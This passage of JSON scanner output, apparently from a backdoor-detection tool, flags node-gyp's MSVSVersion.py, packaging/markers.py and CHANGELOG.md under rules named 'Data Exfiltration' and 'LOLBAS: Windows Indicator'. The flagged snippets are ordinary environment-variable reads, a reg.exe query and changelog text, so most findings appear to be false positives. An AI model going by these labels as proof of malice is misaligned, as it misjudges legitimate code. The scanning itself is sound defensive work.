            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 557,
                  "startColumn": 26,
                  "endLine": 557,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n",
                    "rendered": {
                      "text": "    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n",
                      "markdown": "`    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n            raise ValueError(\n                \"GYP_MSVS_OVERRIDE_PATH requires GYP_MSVS_VERSION to be \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 555,
                  "startColumn": 23,
                  "endLine": 555,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n",
                    "rendered": {
                      "text": "        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n",
                      "markdown": "`        \"2019\": (\"16.0\",),\n        \"2022\": (\"17.0\",),\n    }\n    override_path = os.environ.get(\"GYP_MSVS_OVERRIDE_PATH\")\n    if override_path:\n        msvs_version = os.environ.get(\"GYP_MSVS_VERSION\")\n        if not msvs_version:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 537,
                  "startColumn": 21,
                  "endLine": 537,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n",
                    "rendered": {
                      "text": "  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n",
                      "markdown": "`  \"\"\"\n    # In auto mode, check environment variable for override.\n    if version == \"auto\":\n        version = os.environ.get(\"GYP_MSVS_VERSION\", \"auto\")\n    version_map = {\n        \"auto\": (\"17.0\", \"16.0\", \"15.0\", \"14.0\", \"12.0\", \"10.0\", \"9.0\", \"8.0\", \"11.0\"),\n        \"2005\": (\"8.0\",),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 171,
                  "startColumn": 27,
                  "endLine": 171,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                    "rendered": {
                      "text": "    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n",
                      "markdown": "`    if sys.platform not in (\"win32\", \"cygwin\"):\n        return None\n    # Setup params to pass to and attempt to launch reg.exe\n    cmd = [os.path.join(os.environ.get(\"WINDIR\", \"\"), sysdir, \"reg.exe\"), \"query\", key]\n    if value:\n        cmd.extend([\"/v\", value])\n    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 18,
                  "endLine": 102,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n",
                    "rendered": {
                      "text": "\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n",
                      "markdown": "`\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n        # For VS2017 (and newer) it's fairly easy\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 15,
                  "endLine": 101,
                  "endColumn": 26,
                  "snippet": {
                    "text": "            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n",
                    "rendered": {
                      "text": "            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n",
                      "markdown": "`            return [setup_path, \"/\" + target_arch]\n\n        is_host_arch_x64 = (\n            os.environ.get(\"PROCESSOR_ARCHITECTURE\") == \"AMD64\"\n            or os.environ.get(\"PROCESSOR_ARCHITEW6432\") == \"AMD64\"\n        )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSVersion.py"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 21,
                  "endLine": 95,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n",
                    "rendered": {
                      "text": "        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n",
                      "markdown": "`        # depot_tools build tools and should run SetEnv.Cmd to set up the\n        # environment. The check for WindowsSDKDir alone is not sufficient because\n        # this is set by running vcvarsall.bat.\n        sdk_dir = os.environ.get(\"WindowsSDKDir\", \"\")\n        setup_path = JoinPath(sdk_dir, \"Bin\", \"SetEnv.Cmd\")\n        if self.sdk_based and sdk_dir and os.path.exists(setup_path):\n            return [setup_path, \"/\" + target_arch]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/packaging/markers.py"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 41,
                  "endLine": 118,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    else:\n        return spec.contains(lhs, prereleases=True)\n\n    oper: Optional[Operator] = _operators.get(op.serialize())\n    if oper is None:\n        raise UndefinedComparison(f\"Undefined {op!r} on {lhs!r} and {rhs!r}.\")\n\n",
                    "rendered": {
                      "text": "    else:\n        return spec.contains(lhs, prereleases=True)\n\n    oper: Optional[Operator] = _operators.get(op.serialize())\n    if oper is None:\n        raise UndefinedComparison(f\"Undefined {op!r} on {lhs!r} and {rhs!r}.\")\n\n",
                      "markdown": "`    else:\n        return spec.contains(lhs, prereleases=True)\n\n    oper: Optional[Operator] = _operators.get(op.serialize())\n    if oper is None:\n        raise UndefinedComparison(f\"Undefined {op!r} on {lhs!r} and {rhs!r}.\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 953,
                  "startColumn": 8,
                  "endLine": 953,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n",
                    "rendered": {
                      "text": "  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n",
                      "markdown": "`  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n  * package: add a \"license\" field\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 952,
                  "startColumn": 24,
                  "endLine": 952,
                  "endColumn": 28,
                  "snippet": {
                    "text": "  * gyp: fix for non-acsii userprofile name on Windows\n  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n",
                    "rendered": {
                      "text": "  * gyp: fix for non-acsii userprofile name on Windows\n  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n",
                      "markdown": "`  * gyp: fix for non-acsii userprofile name on Windows\n  * gyp: always install into $PRODUCT_DIR\n  * gyp: apply https://codereview.chromium.org/11361103/\n  * gyp: don't use links at all, just copy the files instead\n  * gyp: update gyp to e1c8fcf7\n  * Updated README.md with updated Windows build info\n  * Show URL when a download fails\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 942,
                  "startColumn": 11,
                  "endLine": 942,
                  "endColumn": 19,
                  "snippet": {
                    "text": "## 2.0.1 / 2015-05-28\n\n  * configure: try/catch the semver range.test() call\n  * README: update for visual studio 2013 (#510, @samccone)\n\n## 2.0.0 / 2015-05-24\n\n",
                    "rendered": {
                      "text": "## 2.0.1 / 2015-05-28\n\n  * configure: try/catch the semver range.test() call\n  * README: update for visual studio 2013 (#510, @samccone)\n\n## 2.0.0 / 2015-05-24\n\n",
                      "markdown": "`## 2.0.1 / 2015-05-28\n\n  * configure: try/catch the semver range.test() call\n  * README: update for visual studio 2013 (#510, @samccone)\n\n## 2.0.0 / 2015-05-24\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 921,
                  "startColumn": 74,
                  "endLine": 921,
                  "endColumn": 82,
                  "snippet": {
                    "text": "/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](https://github.com/nodejs/node-gyp/commit/bbedb8868b)] - **(SEMVER-MAJOR)** **win**: enable delay-load hook by default (Jeremiah Senkpiel) [#708](https://github.com/nodejs/node-gyp/pull/708)\n* [[`8",
                    "rendered": {
                      "text": "/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](https://github.com/nodejs/node-gyp/commit/bbedb8868b)] - **(SEMVER-MAJOR)** **win**: enable delay-load hook by default (Jeremiah Senkpiel) [#708](https://github.com/nodejs/node-gyp/pull/708)\n* [[`8",
                      "markdown": "`/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](https://github.com/nodejs/node-gyp/commit/bbedb8868b)] - **(SEMVER-MAJOR)** **win**: enable delay-load hook by default (Jeremiah Senkpiel) [#708](https://github.com/nodejs/node-gyp/pull/708)\n* [[`8`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 920,
                  "startColumn": 84,
                  "endLine": 920,
                  "endColumn": 92,
                  "snippet": {
                    "text": "-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](h",
                    "rendered": {
                      "text": "-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](h",
                      "markdown": "`-gyp/pull/711)\n* [[`9e9df66a06`](https://github.com/nodejs/node-gyp/commit/9e9df66a06)] - use process.release, make aware of io.js & node v4 differences (Rod Vagg) [#711](https://github.com/nodejs/node-gyp/pull/711)\n* [[`1ea7ed01f4`](https://github.com/nodejs/node-gyp/commit/1ea7ed01f4)] - **deps**: update graceful-fs dependency to the latest (Sakthipriyan Vairamani) [#714](https://github.com/nodejs/node-gyp/pull/714)\n* [[`0fbc387b35`](https://github.com/nodejs/node-gyp/commit/0fbc387b35)] - Update repository URLs. (Ben Noordhuis) [#715](https://github.com/nodejs/node-gyp/pull/715)\n* [[`bbedb8868b`](h`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 897,
                  "startColumn": 74,
                  "endLine": 897,
                  "endColumn": 82,
                  "snippet": {
                    "text": " - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/commit/2ac7de02c4)] - Fix infinite loop with zero-length options. (Ben Noordhuis) [#745](https://github.com/nodejs/node-gyp/pull/745)\n* [[`101bed639b`](https://githu",
                    "rendered": {
                      "text": " - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/commit/2ac7de02c4)] - Fix infinite loop with zero-length options. (Ben Noordhuis) [#745](https://github.com/nodejs/node-gyp/pull/745)\n* [[`101bed639b`](https://githu",
                      "markdown": "` - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/commit/2ac7de02c4)] - Fix infinite loop with zero-length options. (Ben Noordhuis) [#745](https://github.com/nodejs/node-gyp/pull/745)\n* [[`101bed639b`](https://githu`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 896,
                  "startColumn": 74,
                  "endLine": 896,
                  "endColumn": 82,
                  "snippet": {
                    "text": "it/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/c",
                    "rendered": {
                      "text": "it/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/c",
                      "markdown": "`it/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install into $PRODUCT_DIR (Nathan Rajlich)\n* [[`cc8b2fa83e`](https://github.com/nodejs/node-gyp/commit/cc8b2fa83e)] - Update gyp to b3cef02. (Imran Iqbal) [#781](https://github.com/nodejs/node-gyp/pull/781)\n* [[`f5d86eb84e`](https://github.com/nodejs/node-gyp/commit/f5d86eb84e)] - Update to tar@2.0.0. (Edgar Muentes) [#797](https://github.com/nodejs/node-gyp/pull/797)\n* [[`2ac7de02c4`](https://github.com/nodejs/node-gyp/c`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/CHANGELOG.md"
                },
                "region": {
                  "startLine": 893,
                  "startColumn": 99,
                  "endLine": 893,
                  "endColumn": 103,
                  "snippet": {
                    "text": "(https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install int",
                    "rendered": {
                      "text": "(https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install int",
                      "markdown": "`(https://github.com/nodejs/node-gyp/pull/766)\n* [[`d1d6015276`](https://github.com/nodejs/node-gyp/commit/d1d6015276)] - Update broken links and switch to HTTPS. (andrew morton)\n\n## v3.1.0 2015-11-14\n\n* [[`9049241f91`](https://github.com/nodejs/node-gyp/commit/9049241f91)] - **gyp**: don't use links at all, just copy the files instead (Nathan Zadoks)\n* [[`8ef90348d1`](https://github.com/nodejs/node-gyp/commit/8ef90348d1)] - **gyp**: apply https://codereview.chromium.org/11361103/ (Nathan Rajlich)\n* [[`a2ed0df84e`](https://github.com/nodejs/node-gyp/commit/a2ed0df84e)] - **gyp**: always install int`"
                    }
                  },
